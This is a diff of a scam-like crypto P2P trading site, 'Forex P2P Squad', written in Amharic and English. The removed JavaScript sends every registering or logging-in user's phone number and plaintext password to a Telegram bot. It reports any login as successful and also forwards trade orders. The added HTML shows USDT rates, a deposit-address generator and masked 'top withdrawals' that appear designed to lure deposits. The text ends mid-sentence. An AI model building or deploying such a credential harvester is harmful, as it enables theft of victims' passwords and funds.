@@ -1,172 +1,138 @@
-// ተጠቃሚው መግባቱን መከታተያ ሁኔታ (State)
-let isLoggedIn = false;
-let loggedInUserPhone = "";
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forex P2P Squad</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* ለየት ያለ የሚያምር የማሳወቂያ ሳጥን (Toast Notification) */
+        .toast-notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            z-index: 2000;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .toast-notification.show {
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+</head>
+<body>
 
-// 🔄 ገጹ ሲከፈት (Refresh ሲደረግ) የቀድሞ Login መኖሩን ይፈትሻል
-window.onload = function() {
-    const savedUser = localStorage.getItem('currentUserPhone');
-    if (savedUser) {
-        isLoggedIn = true;
-        loggedInUserPhone = savedUser;
-        updateAuthHeader();
-    }
-};
+    <div id="toast" class="toast-notification">መልእክት</div>
 
-// የሚያምር የቶስት መልእክት ማሳያ ፋንክሽን
-function showNotification(text, isError = false) {
-    const toast = document.getElementById('toast');
-    toast.innerText = text;
-    if(isError) {
-        toast.style.background = "linear-gradient(135deg, #ef4444, #dc2626)";
-    } else {
-        toast.style.background = "linear-gradient(135deg, #22c55e, #16a34a)";
-    }
-    toast.classList.add('show');
-    setTimeout(() => {
-        toast.classList.remove('show');
-    }, 3000);
-}
+    <div class="container">
+        
+        <header class="header">
+            <div class="logo-section">
+                <div class="logo-icon"></div>
+                <div class="logo-text">Forex P2P<br>Squad</div>
+            </div>
+            <div class="auth-buttons" id="auth-area">
+                <button class="btn-login" onclick="openModal('login-modal')">Login (ግባ)</button>
+                <button class="btn-register" onclick="openModal('register-modal')">Register (ተመዝገብ)</button>
+            </div>
+        </header>
 
-// ዌብሳይቱ ላይ የላይኛውን አዝራር የመቀየሪያ ሎጂክ
-function updateAuthHeader() {
-    const authArea = document.getElementById('auth-area');
-    if(isLoggedIn) {
-        authArea.innerHTML = `
-            <span style="color: #4ade80; font-size: 0.85rem; font-weight: bold; margin-right: 10px;">👤 ${loggedInUserPhone}</span>
-            <button onclick="handleLogout()" style="background-color: #334155; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 0.8rem;">Logout</button>
-        `;
-    } else {
-        authArea.innerHTML = `
-            <button class="btn-login" onclick="openModal('login-modal')">Login (ግባ)</button>
-            <button class="btn-register" onclick="openModal('register-modal')">Register (ተመዝገብ)</button>
-        `;
-    }
-}
+        <nav class="nav-tabs">
+            <div class="tab active" id="tab-home" onclick="switchTab('home')">🏠 Home</div>
+            <div class="tab" id="tab-trade" onclick="switchTab('trade')">🔄 P2P Trade</div>
+            <div class="tab" id="tab-guide" onclick="switchTab('guide')">📖 Guide</div>
+        </nav>
 
-// Logout ሲያደርግ መረጃውን ያጠፋል
-function handleLogout() {
-    isLoggedIn = false;
-    loggedInUserPhone = "";
-    localStorage.removeItem('currentUserPhone'); // ሴሽኑን ያጠፋል
-    updateAuthHeader();
-    showNotification("ወጥተዋል!");
-}
+        <div id="page-home" class="page-section">
+            <section class="card">
+                <div class="card-title">📈 Withdrawal Rate (BEP20 USDT)</div>
+                <div class="rate-row">
+                    <span class="rate-label">Under 10 USDT</span>
+                    <span class="rate-value">160 ETB</span>
+                </div>
+                <div class="rate-row">
+                    <span class="rate-label">10+ USDT</span>
+                    <span class="rate-value">170 ETB</span>
+                </div>
+            </section>
 
-// ወደ ቴሌግራም መረጃ መላኪያ
-function sendToTelegram(textMessage, successAlert) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: textMessage,
-            parse_mode: "Markdown"
-        })
-    })
-    .then(res => {
-        showNotification(successAlert);
-    })
-    .catch(err => {
-        showNotification("የኔትወርክ ችግር አለ!", true);
-    });
-}
+            <section class="card">
+                <div class="card-title">💳 BEP20 Deposit Address (የማስቀመጫ አድራሻ)</div>
+                <p id="address-instruction" style="font-size: 0.85rem; color: #a0aec0; margin: 0 0 15px 0; line-height: 1.4;">
+                    Generate your unique BEP20 USDT deposit address (የራስዎን የBEP20 አድራሻ ያውጡ)
+                </p>
+                <div id="address-display" style="display: none; background-color: #121620; padding: 12px; border-radius: 8px; border: 1px dashed #f3cd64; margin-bottom: 15px; word-break: break-all; text-align: center; font-family: monospace; color: #f3cd64; font-size: 0.9rem;">
+                </div>
+                <button id="generate-btn" class="btn-generate">Generate BEP20 Address</button>
+            </section>
 
-// Tab Switching
-function switchTab(tabName) {
-    document.querySelectorAll('.page-section').forEach(page => page.style.display = 'none');
-    document.querySelectorAll('.nav-tabs .tab').forEach(tab => tab.classList.remove('active'));
-    document.getElementById('page-' + tabName).style.display = 'block';
-    document.getElementById('tab-' + tabName).classList.add('active');
-}
+            <section class="card">
+                <div class="card-title">🏆 Top Withdrawals (ታላላቅ ክፍያዎች)</div>
+                <div class="user-item">
+                    <div class="user-info"><div class="rank-badge">1</div><div><div class="username">Sen*** Hai***</div><div class="user-sub">0976***87</div></div></div>
+                    <div><div class="amount-gold">6,142 ETB 🏆</div><div class="user-sub" style="text-align: right;">18 Payments</div></div>
+                </div>
+                <div class="user-item">
+                    <div class="user-info"><div class="rank-badge">2</div><div><div class="username">Mua*** Abd***</div><div class="user-sub">0938***47</div></div></div>
+                    <div><div class="amount-gold">4,782 ETB 🏆</div><div class="user-sub" style="text-align: right;">3 Payments</div></div>
+                </div>
+            </section>
+        </div>
 
-function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        <div id="page-trade" class="page-section" style="display: none;">
+            <section class="card">
+                <div class="card-title">🔄 P2P Trade Center (የገዥና ሻጭ ማስተናገጃ)</div>
+                
+                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+                    <button id="trade-buy-btn" onclick="setTradeType('buy')" style="flex: 1; padding: 12px; border-radius: 8px; border: none; font-weight: bold; background-color: #22c55e; color: white; cursor: pointer;">Buy (ግዛ)</button>
+                    <button id="trade-sell-btn" onclick="setTradeType('sell')" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #334155; font-weight: bold; background-color: #1a202e; color: #a0aec0; cursor: pointer;">Sell (ሽጥ)</button>
+                </div>
 
-// Buy/Sell Toggles
-let currentTradeType = 'buy';
-function setTradeType(type) {
-    currentTradeType = type;
-    const buyBtn = document.getElementById('trade-buy-btn');
-    const sellBtn = document.getElementById('trade-sell-btn');
-    const submitBtn = document.getElementById('submit-trade-btn');
+                <form id="p2p-form" onsubmit="handleTradeSubmit(event)">
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Crypto Amount (USDT BEP20)</label>
+                        <input type="number" id="trade-amount" placeholder="መጠን አስገባ (e.g. 50)" required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    </div>
 
-    if(type === 'buy') {
-        buyBtn.style.backgroundColor = '#22c55e'; buyBtn.style.color = 'white';
-        sellBtn.style.backgroundColor = '#1a202e'; sellBtn.style.color = '#a0aec0';
-        submitBtn.innerText = "Submit Buy Order";
-        submitBtn.style.background = "linear-gradient(180deg, #22c55e 0%, #16a34a 100%)";
-    } else {
-        sellBtn.style.backgroundColor = '#ef4444'; sellBtn.style.color = 'white';
-        buyBtn.style.backgroundColor = '#1a202e'; buyBtn.style.color = '#a0aec0';
-        submitBtn.innerText = "Submit Sell Order";
-        submitBtn.style.background = "linear-gradient(180deg, #ef4444 0%, #dc2626 100%)";
-    }
-}
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Payment Method (የክፍያ መንገድ)</label>
+                        <select id="payment-method" style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                            <option value="telebirr">Telebirr (ቴሌብር)</option>
+                            <option value="cbe">CBE (የኢትዮጵያ ንግድ ባንክ)</option>
+                            <option value="boa">BOA (አቢሲኒያ ባንክ)</option>
+                        </select>
+                    </div>
 
-// 1. P2P Trade Submit
-function handleTradeSubmit(event) {
-    event.preventDefault();
-    if(!isLoggedIn) {
-        showNotification("እባክዎ መጀመሪያ Login ያድርጉ! (ቅድሚያ ይግቡ)", true);
-        openModal('login-modal');
-        return;
-    }
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Your Phone Number (ስልክ ቁጥር)</label>
+                        <input type="tel" id="user-phone" placeholder="09..." required style="width: 100%; padding: 12px; border-radius: 8px; background-color: #121620; border: 1px solid #334155; color: white; box-sizing: border-box;">
+                    </div>
 
-    const amount = document.getElementById('trade-amount').value;
-    const method = document.getElementById('payment-method').value;
-    const phone = document.getElementById('user-phone').value;
+                    <button type="submit" id="submit-trade-btn" class="btn-generate" style="background: linear-gradient(180deg, #22c55e 0%, #16a34a 100%); color: white;">Submit Buy Order</button>
+                </form>
+            </section>
+        </div>
 
-    const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
-                `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
-                `💰 *መጠን:* ${amount} USDT (BEP20)\n` +
-                `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
-                `📞 *የደንበኛ ስልክ:* ${phone}`;
+        <div id="page-guide" class="page-section" style="display: none;">
+            <section class="card">
+                <div class="card-title">📖 How to Trade (የአጠቃቀም ቅደም-ተከተል)</div>
+                
+                <div style="display: flex; gap: 15px; margin-bottom: 20px; align-items: flex-start;">
+                    <div style="width: 30px; height: 30px; border-radius: 50%; border: 2px solid #22c55e; color: #22c55e; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">1</div>
+                    <div>
+                        <div style="font-weight: bold; font-size: 0.95rem; margin-bottom: 3px;">Login / Register ያድርጉ</div>
+                        <div style="color: #a0aec0; font-size: 0.85rem;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ።</div>
+                    </div>
+                </div>
 
-    sendToTelegram(msg, "ትዕዛዝዎ በተሳካ ሁኔታ ተመዝግቧል!");
-    document.getElementById('p2p-form').reset();
-}
-
-// 2. Register Handling
-function handleRegisterSubmit(event) {
-    event.preventDefault();
-    const name = document.getElementById('reg-name').value;
-    const phone = document.getElementById('reg-phone').value;
-    const pass = document.getElementById('reg-pass').value;
-
-    const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n` +
-                `👤 *ስም:* ${name}\n` +
-                `📞 *ስልክ ቁጥር:* ${phone}\n` +
-                `🔑 *የይለፍ ቃል:* \`${pass}\``;
-
-    // በራስ-ሰር ሎጊን አድርጎ ሴሽኑን ያስቀምጣል
-    isLoggedIn = true;
-    loggedInUserPhone = phone;
-    localStorage.setItem('currentUserPhone', phone); 
-    updateAuthHeader();
-
-    sendToTelegram(msg, "የምዝገባ ጥያቄዎ በተሳካ ሁኔታ ተልኳል!");
-    closeModal('register-modal');
-    document.getElementById('register-form').reset();
-}
-
-// 3. Login Handling (የተስተካከለ)
-function handleLoginSubmit(event) {
-    event.preventDefault();
-    const phone = document.getElementById('login-phone').value;
-    const pass = document.getElementById('login-pass').value;
-
-    const msg = `🔐 *የግባ (Login) ሙከራ ተደርጓል!*\n\n` +
-                `📞 *ስልክ ቁጥር:* ${phone}\n` +
-                `🔑 *የይለፍ ቃል:* \`${pass}\``;
-
-    // ሎጊን ሲያደርግ ሴሽኑን በቋሚነት ያስቀምጣል
-    isLoggedIn = true;
-    loggedInUserPhone = phone;
-    localStorage.setItem('currentUserPhone', phone); // 💾 እዚህ ጋር ይቀመጣል!
-    updateAuthHeader();
-
-    sendToTelegram(msg, "በተሳካ ሁኔታ ገብተዋል!");
-    closeModal('login-modal');
-    document.getElementById('login-form').reset();
-}
+                <div style="display: flex; gap: 15px; margin-bottom: 20px; align-items: flex-start;">
+                    <div style="width: 30px; height: 30px; border-radius: 50%; border: 2px solid #22c55e; color: #22c55e; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">2</div>
+                    <div>
+                        <div style="font-weight: bold; font-size: 0.95rem; margin-bottom: 3px;">BEP20 Address ያውጡ</div>
+                        <div style="color: #a0aec0; font-size: 0.85rem;">Home ገጽ ላይ በመመለስ የራስዎን የBE
